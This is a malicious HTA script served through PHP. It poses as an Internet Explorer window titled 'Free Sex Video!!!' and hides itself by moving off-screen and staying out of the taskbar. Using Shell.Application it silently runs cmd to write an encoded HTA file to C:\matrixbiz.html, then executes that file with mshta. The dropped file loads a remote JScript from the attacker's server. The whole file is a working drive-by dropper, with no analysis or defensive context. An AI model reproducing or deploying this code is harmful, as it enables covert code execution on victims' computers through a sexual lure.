<HTML>
<HEAD>
<TITLE>Free Sex Video!!! - Microsoft Internet Explorer</TITLE>
    <HTA:APPLICATION ID="oHTA"
     APPLICATIONNAME="myApp"
     BORDER="thin"
     BORDERSTYLE="normal"
     CAPTION="yes"
     ICON="mshta_doc-icon.ico"
     MAXIMIZEBUTTON="yes"
     MINIMIZEBUTTON="yes"
     SHOWINTASKBAR="no"
     SINGLEINSTANCE="no"
     SYSMENU="yes"
     VERSION="1.0"
     WINDOWSTATE="normal"/>

<SCRIPT>
window.moveTo(-10000,-10000);
</SCRIPT>
<SCRIPT>
TargetFile = "C:\\matrixbiz.html";


function replaceSubstring(inputString, fromString, toString) {
   // Goes through the inputString and replaces every occurrence of fromString with toString
   var temp = inputString;
   if (fromString == "") {
      return inputString;
   }
   if (toString.indexOf(fromString) == -1) { // If the string being replaced is not a part of the replacement string (normal situation)
      while (temp.indexOf(fromString) != -1) {
         var toTheLeft = temp.substring(0, temp.indexOf(fromString));
         var toTheRight = temp.substring(temp.indexOf(fromString)+fromString.length, temp.length);
         temp = toTheLeft + toString + toTheRight;
      }
   } else { // String being replaced is part of replacement string (like "+" being replaced with "++") - prevent an infinite loop
      var midStrings = new Array("~", "`", "_", "^", "#");
      var midStringLen = 1;
      var midString = "";
      // Find a string that doesn't exist in the inputString to be used
      // as an "inbetween" string
      while (midString == "") {
         for (var i=0; i < midStrings.length; i++) {
            var tempMidString = "";
            for (var j=0; j < midStringLen; j++) { tempMidString += midStrings[i]; }
            if (fromString.indexOf(tempMidString) == -1) {
               midString = tempMidString;
               i = midStrings.length + 1;
            }
         }
      } // Keep on going until we build an "inbetween" string that doesn't exist
      // Now go through and do two replaces - first, replace the "fromString" with the "inbetween" string
      while (temp.indexOf(fromString) != -1) {
         var toTheLeft = temp.substring(0, temp.indexOf(fromString));
         var toTheRight = temp.substring(temp.indexOf(fromString)+fromString.length, temp.length);
         temp = toTheLeft + midString + toTheRight;
      }
      // Next, replace the "inbetween" string with the "toString"
      while (temp.indexOf(midString) != -1) {
         var toTheLeft = temp.substring(0, temp.indexOf(midString));
         var toTheRight = temp.substring(temp.indexOf(midString)+midString.length, temp.length);
         temp = toTheLeft + toString + toTheRight;
      }
   } // Ends the check to see if the string being replaced is part of the replacement string or not
   return temp; // Send the updated string back to the user
} // Ends the "replaceSubstring" function
s = unescape("%3CHTML%3E%3CHEAD%3E%3CTITLE%3EFree%20Sex%20Video%21%21%21%20-%20Microsoft%20Internet%20Explorer%3C/TITLE%3E%3CHTA%3AAPPLICATION%20ICON%3D%22<?php

echo "http://".$_SERVER["HTTP_HOST"].substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER["REQUEST_URI"],"/"))."/mshta_doc-icon.ico";

?>%22%20SHOWINTASKBAR%3D%22no%22%20WINDOWSTATE%3D%22normal%22/%3E%3CBODY%3E%3CSCRIPT%20LANGUAGE%3D%22JSCRIPT%22%20SRC%3D%22<?php

echo "http://".$_SERVER["HTTP_HOST"].substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER["REQUEST_URI"],"/"))."/localhtajs.php";

?>%22%3E%3C/SCRIPT%3E");
s = replaceSubstring(s,">","^>");
s = replaceSubstring(s,"<","^<");

var objShell = new ActiveXObject("Shell.Application");
objShell.ShellExecute("cmd", "/c echo "+s+"  >  "+TargetFile, "", "open", 0);

sh = new ActiveXObject("Shell.Application");
sh.ShellExecute("mshta",TargetFile);
window.close();

</SCRIPT>
